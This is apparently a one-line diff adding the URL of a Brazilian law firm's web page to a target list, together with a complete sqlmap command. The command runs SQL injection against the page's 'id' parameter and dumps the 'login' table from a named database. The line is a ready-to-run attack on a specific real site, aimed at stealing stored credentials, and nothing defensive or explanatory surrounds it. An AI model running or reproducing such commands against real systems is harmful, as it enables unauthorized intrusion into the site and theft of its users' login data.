@@ -1,0 +1,1 @@
+http://www.delbemadvogados.com.br/?pg=informativos_detalhes&id=95 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.delbemadvogados.com.br/?pg=informativos_detalhes&id=95 -D creativeriopre04 -T login --dump
